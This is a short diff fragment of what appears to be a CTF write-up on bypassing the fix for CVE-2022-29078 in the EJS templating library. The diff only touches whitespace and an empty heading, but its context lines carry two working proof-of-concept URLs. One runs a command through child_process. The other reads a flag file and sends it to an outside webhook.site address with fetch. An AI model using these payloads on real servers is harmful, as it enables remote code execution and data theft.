@@ -946,7 +946,7 @@ The poc below bypasses the fix for `CVE-2022-29078` in `^3.1.7`
       http://127.0.0.1:3000/?name=John&settings[view options][client]=true&settings[view options][escapeFunction]=1;return global.process.mainModule.constructor._load('child_process').execSync('calc');
 
 - Poc for out-of-band exfiltration
-
+  
       http://127.0.0.1:3000/?settings[view%20options][client]=true&settings[view%20options][escapeFunction]=1;return%20fetch(`https://webhook.site/fb92548e-56b3-4f02-9ca7-2b702be8f227?flag=${process.mainModule.require('child_process').execSync('cat%20flag-aaee2b1430.txt').toString()}`);//
 
 ### Testing on version `^3.1.9` in PatriotCtf with the above POC
@@ -955,9 +955,7 @@ The poc below bypasses the fix for `CVE-2022-29078` in `^3.1.7`
 
 ![image](https://github.com/user-attachments/assets/de683e16-2030-41b1-9e10-28bbfb267607)
 
-### Out of band exfiltration with post-bin
 
--
 ---------------------
 
 ### REFERENCES:
